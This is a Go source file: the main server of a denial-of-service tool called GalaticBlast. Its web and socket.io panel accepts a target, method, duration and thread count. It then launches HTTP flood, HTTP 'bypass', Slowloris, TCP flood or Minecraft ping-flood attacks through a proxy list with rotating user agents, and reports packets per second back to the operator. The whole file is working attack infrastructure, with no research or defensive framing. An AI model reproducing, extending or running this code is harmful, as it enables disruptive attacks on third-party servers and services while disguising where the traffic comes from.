package main

import (
	"encoding/base64"
	"fmt"
	"net/http"
	"os"
	"time"

	"github.com/galaticBlast/galaticBlast/internal/attacks/game"
	httpattacks "github.com/galaticBlast/galaticBlast/internal/attacks/http"
	"github.com/galaticBlast/galaticBlast/internal/attacks/tcp"
	"github.com/galaticBlast/galaticBlast/internal/config"
	"github.com/galaticBlast/galaticBlast/internal/engine"
	"github.com/galaticBlast/galaticBlast/internal/proxy"
	"github.com/galaticBlast/galaticBlast/pkg/api"
	"github.com/galaticBlast/galaticBlast/pkg/target"
	"github.com/labstack/echo/v4"
	"github.com/labstack/echo/v4/middleware"
	socketio "github.com/googollee/go-socket.io"
	"github.com/rs/zerolog/log"
)

func main() {
	cfg, err := config.Load("")
	if err != nil {
		log.Fatal().Err(err).Msg("failed to load config")
	}

	eng := engine.NewEngine()
	registerWorkers(eng.Registry())

	proxies, err := proxy.LoadProxies(cfg.ProxiesFile)
	if err != nil {
		log.Warn().Err(err).Msg("could not load proxies")
		proxies = []engine.Proxy{}
	}

	userAgents, err := proxy.LoadUserAgents(cfg.UserAgentsFile)
	if err != nil {
		log.Warn().Err(err).Msg("could not load user agents")
		userAgents = []string{"GalaticBlast/1.0"}
	}

	ioServer := socketio.NewServer(nil)

	ioServer.OnConnect("/", func(s socketio.Conn) error {
		s.SetContext("")
		log.Info().Str("id", s.ID()).Msg("client connected")

		s.Emit("stats", api.StatsPayload{
			PPS:     0,
			Proxies: len(proxies),
			Log:     "Connected to GalaticBlast",
		})
		return nil
	})

	ioServer.OnEvent("/", "startAttack", func(s socketio.Conn, payload api.StartAttackRequest) {
		log.Info().
			Str("target", payload.Target).
			Str("method", payload.AttackMethod).
			Msg("attack requested")

		method := engine.AttackKind(payload.AttackMethod)
		filteredProxies := proxy.FilterByMethod(proxies, method)

		if len(filteredProxies) == 0 && len(proxies) > 0 {
			s.Emit("attackAccepted", api.AttackAcceptedResponse{
				OK:      false,
				Proxies: 0,
			})
			return
		}

		targetNode := target.ParseTarget(payload.Target)

		duration := time.Duration(payload.DurationSec) * time.Second
		if duration == 0 {
			duration = 30 * time.Second
		}

		packetDelay := time.Duration(payload.PacketDelay) * time.Millisecond
		if packetDelay == 0 {
			packetDelay = 100 * time.Millisecond
		}

		packetSize := payload.PacketSize
		if packetSize == 0 {
			packetSize = 64
		}

		threads := payload.Threads
		if threads == 0 {
			threads = 4
		}

		params := engine.AttackParams{
			Target:      payload.Target,
			TargetNode:  targetNode,
			Duration:    duration,
			PacketDelay: packetDelay,
			PacketSize:  packetSize,
			Method:      method,
			Threads:     threads,
			Verbose:     true,
		}

		attackID := "client-" + s.ID()
		eng.Stop(attackID)

		instance := eng.Start(attackID, params, filteredProxies, userAgents)
		if instance == nil {
			s.Emit("attackAccepted", api.AttackAcceptedResponse{
				OK:      false,
				Proxies: len(filteredProxies),
			})
			return
		}

		s.Emit("attackAccepted", api.AttackAcceptedResponse{
			OK:      true,
			Proxies: len(filteredProxies),
		})

		go func() {
			for stats := range instance.StatsCh {
				s.Emit("stats", api.StatsPayload{
					Timestamp:    stats.Timestamp.Unix(),
					PPS:          stats.PacketsPerS,
					TotalPackets: stats.TotalPackets,
					Proxies:      stats.Proxies,
					Log:          stats.Log,
				})
			}
			s.Emit("attackEnd")
		}()
	})

	ioServer.OnEvent("/", "stopAttack", func(s socketio.Conn) {
		attackID := "client-" + s.ID()
		eng.Stop(attackID)
		s.Emit("attackEnd")
	})

	ioServer.OnDisconnect("/", func(s socketio.Conn, reason string) {
		log.Info().Str("id", s.ID()).Str("reason", reason).Msg("client disconnected")
		attackID := "client-" + s.ID()
		eng.Stop(attackID)
	})

	go func() {
		if err := ioServer.Serve(); err != nil {
			log.Fatal().Err(err).Msg("socket.io server failed")
		}
	}()
	defer ioServer.Close()

	e := echo.New()
	e.Use(middleware.Logger())
	e.Use(middleware.Recover())
	e.Use(middleware.CORSWithConfig(middleware.CORSConfig{
		AllowOrigins: []string{cfg.AllowedOrigin},
		AllowMethods: []string{echo.GET, echo.POST, echo.OPTIONS},
		AllowHeaders: []string{echo.HeaderOrigin, echo.HeaderContentType, echo.HeaderAccept},
	}))

	e.Any("/socket.io/*", echo.WrapHandler(ioServer))

	e.GET("/attacks", func(c echo.Context) error {
		kinds := eng.Registry().ListKinds()
		attacks := make([]string, len(kinds))
		for i, k := range kinds {
			attacks[i] = string(k)
		}
		return c.JSON(http.StatusOK, api.AttackListResponse{Attacks: attacks})
	})

	e.GET("/configuration", func(c echo.Context) error {
		proxiesData, _ := os.ReadFile(cfg.ProxiesFile)
		uasData, _ := os.ReadFile(cfg.UserAgentsFile)

		return c.JSON(http.StatusOK, api.ConfigurationResponse{
			Proxies: base64.StdEncoding.EncodeToString(proxiesData),
			UAs:     base64.StdEncoding.EncodeToString(uasData),
		})
	})

	e.POST("/configuration", func(c echo.Context) error {
		var config api.ConfigurationResponse
		if err := c.Bind(&config); err != nil {
			return c.JSON(http.StatusBadRequest, map[string]string{"error": err.Error()})
		}

		if config.Proxies != "" {
			proxiesData, err := base64.StdEncoding.DecodeString(config.Proxies)
			if err == nil {
				os.WriteFile(cfg.ProxiesFile, proxiesData, 0644)
			}
		}

		if config.UAs != "" {
			uasData, err := base64.StdEncoding.DecodeString(config.UAs)
			if err == nil {
				os.WriteFile(cfg.UserAgentsFile, uasData, 0644)
			}
		}

		return c.JSON(http.StatusOK, map[string]string{"status": "ok"})
	})

	e.Static("/", "web-client/dist")

	port := cfg.ServerPort
	fmt.Printf("GalaticBlast Server starting on port %d\n", port)
	e.Logger.Fatal(e.Start(fmt.Sprintf(":%d", port)))
}

func registerWorkers(reg *engine.Registry) {
	reg.Register(engine.HTTPFlood, httpattacks.NewFloodWorker())
	reg.Register(engine.HTTPBypass, httpattacks.NewBypassWorker())
	reg.Register(engine.HTTPSlowloris, httpattacks.NewSlowlorisWorker())
	reg.Register(engine.TCPFlood, tcp.NewFloodWorker())
	reg.Register(engine.MinecraftPing, game.NewMinecraftPingWorker())
}
